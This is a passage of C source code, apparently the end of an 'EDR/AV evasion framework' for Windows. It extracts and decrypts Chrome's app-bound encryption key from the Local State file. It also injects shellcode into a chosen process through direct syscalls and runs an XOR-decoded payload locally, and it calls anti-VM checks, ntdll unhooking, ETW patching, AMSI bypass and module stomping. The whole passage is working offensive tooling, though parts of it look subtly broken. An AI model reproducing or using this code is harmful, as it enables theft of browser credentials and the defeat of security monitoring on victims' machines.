        result = IIDFromString(L"{A949CB4E-C4F9-44C4-B213-6BF8AA9AC69C}", &iid);
        if (SUCCEEDED(result)) {
            hr = CoCreateInstance(clsid, NULL, CLSCTX_LOCAL_SERVER, iid, &pElevator);
        }
    }

    if (FAILED(hr) || !pElevator) {
        CoUninitialize();
        return false;
    }

    wchar_t localStatePath[MAX_PATH];
    wsprintfW(localStatePath, L"%s\\Local State", chromeDir);

    BYTE encryptedKey[4096] = { 0 };
    DWORD encryptedSize = 0;

    HANDLE hFile = CreateFileW(localStatePath, GENERIC_READ, FILE_SHARE_READ,
        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hFile == INVALID_HANDLE_VALUE) {
        pElevator->Release();
        CoUninitialize();
        return false;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize > 0 && fileSize < 65536) {
        BYTE* fileData = (BYTE*)malloc(fileSize + 1);
        if (fileData) {
            DWORD bytesRead;
            if (ReadFile(hFile, fileData, fileSize, &bytesRead, NULL)) {
                fileData[fileSize] = 0;
                char* keyStart = strstr((char*)fileData, "\"app_bound_encrypted_key\":\"");
                if (keyStart) {
                    keyStart += 28;
                    char* keyEnd = strstr(keyStart, "\"");
                    if (keyEnd) {
                        int keyLen = (int)(keyEnd - keyStart);
                        for (int i = 0; i < keyLen && i < 4096; i += 2) {
                            char hex[3] = { keyStart[i], keyStart[i + 1], 0 };
                            encryptedKey[i / 2] = (BYTE)strtol(hex, NULL, 16);
                        }
                        encryptedSize = keyLen / 2;
                    }
                }
            }
            free(fileData);
        }
    }
    CloseHandle(hFile);

    if (encryptedSize == 0) {
        pElevator->Release();
        CoUninitialize();
        return false;
    }

    BYTE decryptedKey[4096] = { 0 };
    DWORD decryptedSize = 4096;

    typedef HRESULT(WINAPI* DecryptFunc)(PVOID, const wchar_t*, int, BYTE*, DWORD*);
    DecryptFunc pDecrypt = (DecryptFunc)GetProcAddress((HMODULE)pElevator, "Decrypt");

    if (pDecrypt) {
        hr = pDecrypt(pElevator, (const wchar_t*)encryptedKey, encryptedSize, decryptedKey, &decryptedSize);
    }

    pElevator->Release();
    CoUninitialize();

    return SUCCEEDED(hr) && decryptedSize > 0;
#else
    return false;
#endif
}

static void ExecutePayload(BYTE* payload, SIZE_T size) {
    if (!payload || size == 0) return;

    XorEncryptPayload(payload, size, PAYLOAD_XOR_KEY);

    DWORD oldProtect;
    VirtualProtect(payload, size, PAGE_EXECUTE_READWRITE, &oldProtect);

    void (*func)() = (void(*)())payload;
    func();

    VirtualProtect(payload, size, oldProtect, &oldProtect);
}

static bool InjectPayload(BYTE* shellcode, SIZE_T size, DWORD targetPid) {
    HANDLE hProcess = NULL;
    CLIENT_ID cid = { (HANDLE)(DWORD_PTR)targetPid, NULL };
    OBJECT_ATTRIBUTES oa = { sizeof(OBJECT_ATTRIBUTES) };

    NTSTATUS status = NtOpenProcessSyscall(&hProcess, PROCESS_ALL_ACCESS, &oa, &cid);
    if (!NT_SUCCESS(status)) {
        hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
        if (!hProcess) return false;
    }

    PVOID pRemoteMem = NULL;
    SIZE_T regionSize = size;

    status = NtAllocateVirtualMemorySyscall(hProcess, &pRemoteMem, 0, &regionSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!NT_SUCCESS(status)) {
        pRemoteMem = VirtualAllocEx(hProcess, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!pRemoteMem) {
            NtCloseSyscall(hProcess);
            return false;
        }
    }

    SIZE_T bytesWritten = 0;
    status = NtWriteVirtualMemorySyscall(hProcess, pRemoteMem, shellcode, size, &bytesWritten);

    if (!NT_SUCCESS(status)) {
        if (!WriteProcessMemory(hProcess, pRemoteMem, shellcode, size, &bytesWritten)) {
            NtCloseSyscall(hProcess);
            return false;
        }
    }

    DWORD oldProtect;
    status = NtProtectVirtualMemorySyscall(hProcess, &pRemoteMem, &regionSize,
        PAGE_EXECUTE_READ, &oldProtect);

    if (!NT_SUCCESS(status)) {
        VirtualProtectEx(hProcess, pRemoteMem, regionSize, PAGE_EXECUTE_READ, &oldProtect);
    }

    HANDLE hThread = NULL;
    status = NtCreateThreadExSyscall(&hThread, THREAD_ALL_ACCESS, NULL, hProcess,
        (PVOID)pRemoteMem, NULL, 0, 0, 0, 0, NULL);

    if (!NT_SUCCESS(status)) {
        hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteMem,
            NULL, 0, NULL);
        if (!hThread) {
            NtCloseSyscall(hProcess);
            return false;
        }
    }

    if (hThread) {
        NtResumeThreadSyscall(hThread, NULL);
        NtCloseSyscall(hThread);
    }

    NtCloseSyscall(hProcess);
    return true;
}

static BYTE g_shellcode[] = {
    0x48, 0x31, 0xC0, 0x48, 0x31, 0xDB, 0x48, 0x31,
    0xC9, 0x48, 0x31, 0xD2, 0x48, 0x31, 0xF6, 0x48,
    0x31, 0xFF, 0x48, 0x31, 0xED, 0x48, 0x31, 0xE4,
    0x48, 0x31, 0xE9, 0x48, 0x31, 0xF2, 0x48, 0x31,
    0xDB, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x48, 0x83,
    0xEC, 0x28, 0x48, 0x89, 0xE1, 0x48, 0x31, 0xD2,
    0x48, 0x83, 0xC4, 0x28, 0xC3
};

int main(int argc, char* argv[]) {
    DWORD targetPid = 0;
    if (argc > 1) {
        targetPid = atoi(argv[1]);
    }

    printf("Advanced EDR/AV Evasion Framework\n");
    printf("================================\n\n");

    if (!PerformAntiVMChecks()) {
        printf("[!] VM/Sandbox/ Debugger detected. Exiting.\n");
        return 0;
    }
    printf("[+] Anti-VM checks passed.\n");

    if (!InitializeSyscalls()) {
        printf("[!] Failed to initialize syscalls.\n");
        return 1;
    }
    printf("[+] Syscalls initialized. (%d syscalls resolved)\n", g_syscallCount);

#if CONFIG_ENABLE_NTDLL_UNHOOKING
    if (UnhookNtdll()) {
        printf("[+] ntdll unhooked successfully.\n");
    } else {
        printf("[!] ntdll unhooking failed.\n");
    }
#endif

#if CONFIG_ENABLE_ETW_PATCHING
    if (PatchETW()) {
        printf("[+] ETW patched successfully.\n");
    } else {
        printf("[!] ETW patching failed.\n");
    }
#endif

#if CONFIG_ENABLE_AMSI_BYPASS
    if (PatchAMSI()) {
        printf("[+] AMSI bypassed successfully.\n");
    } else {
        printf("[!] AMSI bypass failed.\n");
    }
#endif

#if CONFIG_ENABLE_HWBP_CLEARING
    if (ClearHardwareBreakpoints()) {
        printf("[+] Hardware breakpoints cleared.\n");
    }
#endif

#if CONFIG_ENABLE_CHROME_ABE_BYPASS
    if (BypassChromeAppBoundEncryption()) {
        printf("[+] Chrome App-Bound Encryption bypassed.\n");
    } else {
        printf("[!] Chrome App-Bound Encryption bypass failed.\n");
    }
#endif

    BYTE* payload = g_shellcode;
    SIZE_T payloadSize = sizeof(g_shellcode);

#if CONFIG_ENABLE_MODULE_STOMPING
    if (ModuleStomping(payload, payloadSize)) {
        printf("[+] Module stomping successful.\n");
        printf("[+] Payload executed via module stomping.\n");
        return 0;
    }
#endif

    if (targetPid > 0) {
        if (InjectPayload(payload, payloadSize, targetPid)) {
            printf("[+] Payload injected into process %d.\n", targetPid);
            return 0;
        }
        printf("[!] Payload injection failed.\n");
    }

#if CONFIG_ENABLE_SLEEP_OBFUSCATION
    SleepObfuscation(payload, payloadSize, 5000);
    printf("[+] Sleep obfuscation completed.\n");
#endif

    ExecutePayload(payload, payloadSize);
    printf("[+] Payload executed locally.\n");

    return 0;
}